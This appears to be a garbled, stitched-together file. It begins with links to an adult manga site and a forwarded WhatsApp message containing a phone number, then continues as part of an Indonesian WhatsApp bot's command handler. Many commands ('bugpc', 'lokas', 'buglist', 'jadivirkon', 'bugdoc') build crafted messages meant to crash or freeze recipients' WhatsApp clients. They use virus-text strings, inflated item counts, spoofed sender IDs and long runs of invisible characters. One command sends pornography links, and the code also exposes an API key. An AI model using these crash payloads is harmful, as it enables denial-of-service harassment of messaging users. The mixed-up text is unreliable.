https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
[8/6 10.48] +62 812-8025-1698: Happy Mother's Day 165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536, yg suka mamah

Random
 257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777  260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554`
				wibu.sendMessage(from, fcrew, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, caption: kodenuk, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break			
case 'linkbokep':
        sendButtonLocation(from, 
        `[NO VPN]\n➻ *NO VPN1* : bit.ly/2Qn9Qgu\n➻ *NO VPN2* : bit.ly/3gWaBt8\n➻ *XNXX VPN* : bit.ly/3vJZJ7`,
        `Sebelum Comly Siapin sabun/tisu dulu adick²`, 
        {jpegThumbnail:fs.readFileSync(`./media/thumnail.jpg`)}, 

[{ buttonId: `${prefix}hshdbdhhd`, buttonText: { displayText: 'OK' }, type: 1 },
{ buttonId: `${prefix}hdbdjdhdhd`, buttonText: { displayText: 'Tidak😑' }, type: 1 }])
         break                            
         case 'music1':     
         const CakMate = fs.readFileSync('mp3/sound1.mp3')
         wibu.sendMessage(from, CakMate, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music2':     
         const CakMate2 = fs.readFileSync('mp3/sound2.mp3')
         wibu.sendMessage(from, CakMate2, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music3':     
         const CakMate3 = fs.readFileSync('mp3/sound3.mp3')
         wibu.sendMessage(from, CakMate3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music4':     
         const CakMate4 = fs.readFileSync('mp3/sound4.mp3')
         wibu.sendMessage(from, CakMate4, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music5':     
         const CakMate5 = fs.readFileSync('mp3/sound5.mp3')
         wibu.sendMessage(from, CakMate5, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music6':     
         const CakMate6 = fs.readFileSync('mp3/sound6.mp3')
         wibu.sendMessage(from, CakMate6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music7':     
         const CakMate7 = fs.readFileSync('mp3/sound7.mp3')
         wibu.sendMessage(from, CakMate7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music8':     
         const CakMate8 = fs.readFileSync('mp3/sound8.mp3')
         wibu.sendMessage(from, CakMate8, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music9':     
         const CakMate9 = fs.readFileSync('mp3/sound9.mp3')
         wibu.sendMessage(from, CakMate9, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'music10':     
         const CakMate10 = fs.readFileSync('mp3/sound10.mp3')
         wibu.sendMessage(from, CakMate10, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'bugbutton':
				if (!mek.key.fromMe) return reply('Lu siapa')
				gam = fs.readFileSync('./media/thumnail.jpg')
         const ahageo = `${buttonvirus}`
         const sasageo = `${ranzmods}`
		sendButtonLocation(from, "BUG BY RANZ M5\n https://youtube.com/channel/UCSpYxXxRuGOfezlWd1S7Amw", 'https://youtu.be/QShjlsC5-wc', {thumbnail: gam}, [{buttonId:`${prefix}command`,buttonText:{displayText: `${ahageo}`},type:1},{buttonId:`${prefix}id10`,buttonText:{displayText: `${sasageo}`},type:1},{buttonId:`${prefix}id2`,buttonText:{displayText:`${ahageo}`},type:1}], {contextInfo: { mentionedJid: [sender, `${owner}` + '@s.whatsapp.net']}})
         break
         case 'bugpc':
					if (!mek.key.fromMe) return reply('lu siapa')
buf = fs.readFileSync('./media/ranz.jpg')
imeu = await wibu.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await wibu.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `${buttonvirus}`,
"jpegThumbnail": fs.readFileSync('./media/ranz.jpg')
}
}, {quoted:imeu, contextInfo:{}})
wibu.relayWAMessage(jk)
await setTimeout(() => {
reply('BY RANZ MODS')
}, 3000)
break
           case 'lokas':
if (!mek.key.fromMe && !isOwner) return
wibu.updatePresence(from, Presence.composing)
		       wibu.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${buttonvirus}`,
						address: `${buttonvirus}`,
                        jpegThumbnail: reply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${buttonvirus}`,
    orderTitle: `${buttonvirus}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'buglist':
        if (!isOwner && !mek.key.fromMe) return reply(`Lu Siapa Sih`)
        wibu.toggleDisappearingMessages(from, 0)
        listMsg = {
 buttonText: buttonvirus,
 footerText: `RANZ M5`,
 description: `RANZ M5`,
 sections: [
                     {
                      "title": buttonvirus,
 rows: [
                          {
                              "title": `${buttonvirus}`,
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
wibu.sendMessage(from, listMsg, MessageType.listMessage, {quoted: mek})
        wibu.toggleDisappearingMessages(from, 0)

break
case 'jadicatalog':
   if (!q) return reply(`Teks?`)
 if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
   let media = await wibu.downloadMediaMessage(encmedia)
   imeu = await wibu.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await wibu.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "title": `${q}           ${cvirus}`,
             "description": `${cvirus}`,
             "retailerId": "ranz",
         },
         "businessOwnerJid": "994406910135@s.whatsapp.net",
          "contextInfo": {
            "forwardingScore": 0,
            "footer": cvirus,
            "isForwarded": false
        }
    }
}, {quoted: mek, contextInfo:{}})
   wibu.relayWAMessage(res)
}
break
case 'public':
				if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
			publik = true
				replyy('Sukses mengubah mode self ke public')
			break
			case 'self':
			if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
				publik = false
				replyy('Sukses mengubah mode public ke self')
			break
           case 'modebot':
menunya = `Silahkan Pilih Mode Di Bawah Ini Untuk Mengubah Mode Bot 😅
`

	teks =
`
IMV BOT
`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [{buttonId: `${prefix}self`, buttonText: { displayText: 'SELF IMV BOT' }, type: 1 },{buttonId: `${prefix}public`, buttonText: { displayText: 'PUBLIC IMV BOT' }, type: 1 },]
sendButImage(from, teks, `${menunya}`, gam, but)        
break 
case 'artinama':
if (args.length == 0) return reply(`Namamya Mana Tod\nContoh: ${prefix + command} Zero YT7`)
ini_nama = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/artinama?apikey=ZeroYT7&nama=${ini_nama}`)
reply(get_result.result)
break
case 'jodoh':
if (args.length == 0) return reply(`Namanya Mana Tod\nContoh: ${prefix + command} Zero & Sandrinna`)
ini_nama = args.join(" ").split("&")
nama1 = ini_nama[0].trim()
nama2 = ini_nama[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=ZeroYT7`)
get_result = get_result.result
ini_txt = `Positif : ${get_result.positif}\n`
ini_txt += `Negative : ${get_result.negatif}\n`
ini_txt += `Deskripsi : ${get_result.deskripsi}`
reply(ini_txt)
break
case 'jadian':
if (args.length == 0) return reply(`Tanggal Jadiannya Mana Tod\nContoh: ${prefix + command} 12 12 2020`)
tanggal = args[0]
bulan = args[1]
tahun = args[2]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=ZeroYT7`)
get_result = get_result.result
ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
ini_txt += `Deskripsi : ${get_result.deskripsi}`
reply(ini_txt)
break
case 'bugweb':
teks = `INVISIBLE MAX VOLUTION\nWebpage ${ranzmods}`
wibu.sendMessage(from, teks, text, { quoted: mek, contextInfo: { externalAdReply: { title: `${philips}`, body: philips, sourceUrl: "https://youtube.com/channel/UCSpYxXxRuGOfezlWd1S7Amw", thumbnail : fs.readFileSync('./media/thumnail.jpg') }}})
break
case 'virgamv1':
cokvirus = fs.readFileSync('media/ranz.jpg')
wibu.sendMessage(from, cokvirus, image, {thumbnail : fs.readFileSync('database/virtex/white.jpg')})
break
case 'virgamv2':
cokvirus = fs.readFileSync('database/virtex/ranzgam.jpg')
wibu.sendMessage(from, cokvirus, image, {thumbnail : fs.readFileSync('database/virtex/white.jpg')})
break
case 'jadivirgamv1':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            media = await wibu.downloadAndSaveMediaMessage(ger)
            wibu.sendMessage(from, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("database/virtex/white.jpg")})
break
case 'jadivirgamv2':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            media = await wibu.downloadAndSaveMediaMessage(ger)
            wibu.sendMessage(from, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("database/virtex/white.jpg")})
break
case 'jadivirvidv1':
 if (!isQuotedVideo) return reply('Reply Videonya!')
			if ((isMedia || isQuotedVideo ) && args.length == 0) 
            ger = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            media = await wibu.downloadAndSaveMediaMessage(ger)
            wibu.sendMessage(from, fs.readFileSync(media), video, {thumbnail: fs.readFileSync("database/virtex/white.jpg")})
break
case 'jadivirvidv2':
 if (!isQuotedVideo) return reply('Reply Videonya!')
			if ((isMedia || isQuotedVideo ) && args.length == 0) 
            ger = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            media = await wibu.downloadAndSaveMediaMessage(ger)
            wibu.sendMessage(from, fs.readFileSync(media), video, {thumbnail: fs.readFileSync("database/virtex/white.jpg")})
break
case 'document':
         if (!mek.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./media/ranz.txt')
wibu.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'RANZ️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${philips}`, mimetype: 'application/txt'})
break
case 'pdf':
         if (!mek.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./media/ranz.txt')
wibu.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'RANZ️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${philips}.pdf`, mimetype: 'application/txt'})
break
case 'jadidocument':
if (!q) return reply(`Teks?`)
         if (!mek.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./media/ranz.txt')
wibu.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'RANZ️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${q}${philips}.txt`, mimetype: 'application/txt'})
break
case 'jadipdf':
if (!q) return reply(`Teks?`)
         if (!mek.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./media/ranz.txt')
wibu.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'RANZ️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${q}${philips}.pdf`, mimetype: 'application/txt'})
break
case 'jadivirkon':
if (!mek.key.fromMe) return replyy('Sok Asik Bet')
pe = args.join('')
top = pe.split('|')[0]
bottom = pe.split('|')[1]
res = await wibu.prepareMessageFromContent(from,{
"contactMessage": {
"displayName": `${top}     ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎